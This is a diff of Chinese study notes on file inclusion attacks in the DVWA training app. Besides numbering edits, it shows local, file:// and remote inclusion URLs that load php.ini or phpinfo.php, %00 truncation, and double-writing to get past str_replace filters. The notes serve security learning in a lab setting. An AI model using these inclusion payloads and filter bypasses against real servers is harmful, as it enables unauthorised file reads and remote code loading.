@@ -18,9 +18,9 @@ php版本小于5.3.24的服务器中，可以在文件名中使用%00进行截�
 
 1.本地文件包含
 
-绝对路径
+(1) 绝对路径
 
-相对路径
+(2) 相对路径
 
 str_replace函数是极其不安全的，因为可以使用双写绕过替换规则
 
@@ -32,7 +32,7 @@ str_replace函数是极其不安全的，因为可以使用双写绕过替换规
 
 ```http://192.168.153.130/dvwa/vulnerabilities/fi/page=C:/xampp/htdocs/dvwa/php.ini```
 
-file协议包含：
+(3) file协议包含：
 
 ```http://localhost:808/DVWA-master/vulnerabilities/fi/?page=file:///E:/software/phpstudy/WWW/phpinfo.php```
 
@@ -40,10 +40,11 @@ file协议包含：
 
 2.远程文件包含
 
-allow\_url\_fopen与allow\_url\_include
+
+需要 allow\_url\_fopen与allow\_url\_include
 
 ```http://192.168.255.151:8081/DVWA-master/vulnerabilities/fi/?page=http://192.168.0.103:808/phpinfo.php```
 
-
+<br>
 
 Impossible级别的代码使用了白名单机制进行防护
